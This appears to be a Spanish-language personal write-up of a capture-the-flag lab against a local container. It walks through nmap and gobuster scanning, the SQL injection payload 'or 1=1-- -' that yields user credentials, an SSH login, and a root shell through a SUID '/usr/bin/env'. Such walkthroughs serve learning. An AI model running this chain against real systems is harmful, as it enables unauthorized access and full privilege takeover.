1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn "IP" -oN "NombreFichero"`
![[Pasted image 20241118182125.png]]

2. Navegamos a la web del puerto 80 (HTTP):
![[Pasted image 20241118182559.png]]

3. Viendo que es una web realizamos un scaneo de directorios con [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]]:
`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,sh,py`
![[Pasted image 20241118182945.png]]

4. Revisamos el `index.php` vamos a probar una inyección SQL estándar:
`or 1=1-- -`
![[Pasted image 20241118183422.png]]

Conseguimos obtener los datos de un usuario y su contraseña:
![[Pasted image 20241118183515.png]]

5. Accedemos vía SSH:
`ssh dylan@172.17.0.2`
![[Pasted image 20241118183806.png]]

6. Escalada de privilegios:
- Buscamos binarios con permisos SUID
`find / -perm -4000 -user root 2>/dev/null`
![[Pasted image 20241118184103.png]]

7. Vemos que se encuentra el binario `/usr/bin/env` ejecutamos `/usr/bin/env /bin/bash -p` para obtener una bash como root:
![[Pasted image 20241118184324.png]]